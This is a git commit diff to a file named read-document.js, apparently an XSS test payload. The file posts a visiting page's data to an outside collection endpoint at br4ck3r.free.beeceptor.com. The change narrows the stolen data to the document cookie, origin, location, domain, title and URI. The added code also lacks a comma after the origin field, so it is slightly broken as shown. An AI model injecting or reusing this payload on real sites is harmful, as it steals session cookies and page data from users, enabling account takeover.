d336e08b90edb5139d993da28a719136fe5cc5af
Alexander-Jordan <curtjordan93@gmail.com>
2025-05-13 15:19:19 +0200

    Test more specific properties

--- read-document.js
+++ read-document.js
@@ -1,6 +1,15 @@
 fetch('https://br4ck3r.free.beeceptor.com/xss-test', {
 	method: 'POST',
 	headers: { 'Content-Type': 'application/json' },
-	body: JSON.stringify({ data: window }),
+	body: JSON.stringify({
+		data: {
+			cookie: window.document.cookie,
+			origin: window.origin
+			location: window.document.location,
+			domain: window.document.domain,
+			title: window.document.title,
+			uri: window.document.documentURI,
+		},
+	}),
 });
 console.log(window);
